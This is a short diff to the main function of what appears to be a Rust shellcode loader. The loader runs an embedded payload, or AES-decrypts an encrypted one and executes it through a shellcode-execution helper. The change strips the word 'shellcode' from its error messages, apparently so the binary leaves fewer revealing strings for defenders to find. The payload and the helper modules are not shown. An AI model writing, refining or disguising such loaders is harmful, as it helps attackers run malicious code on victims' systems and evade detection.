@@ -135,7 +135,7 @@ fn main() {
         {
             let shellcode = ENCPAYLOAD.to_vec();
             if !execution::shellcode_execute_default(shellcode) {
-                eprintln!("Failed to execute shellcode");
+                eprintln!("Failed to execute");
             }
         }
 
@@ -146,11 +146,11 @@ fn main() {
             match decrypt_payload(encrypted_shellcode, &aes_key, &aes_iv) {
                 Some(decrypted_shellcode) => {
                     if !execution::shellcode_execute_default(decrypted_shellcode) {
-                        eprintln!("Failed to execute shellcode");
+                        eprintln!("Failed to execute");
                     }
                 }
                 None => {
-                    eprintln!("Failed to decrypt shellcode");
+                    eprintln!("Failed to decrypt");
                 }
             }
         }
